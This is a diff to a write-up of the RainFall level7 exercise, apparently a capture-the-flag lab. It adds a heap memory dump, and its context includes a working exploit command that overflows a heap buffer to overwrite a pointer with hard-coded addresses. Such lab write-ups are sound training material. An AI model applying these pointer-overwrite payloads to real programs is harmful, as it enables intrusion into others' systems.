@@ -53,6 +53,13 @@ level7@RainFall:~$ ltrace ./level7 AAAAAAAA BBBBBBBB
   
   `./level7 $(python -c 'print "A" * 20 + "\x08\x04\x99\x28"[::-1]') $(python -c 'print "\x08\x04\x84\xf4"[::-1]')`
   
+ Heap befor srcpy 1 
+```
+"--------------HEAP------------"
+0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
+0x804a010:	0x00000000	0x00000011	0x00000000	0x00000000
+0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038 
+```
   Heap after srcpy 1
   ```
   "--------------HEAP------------"
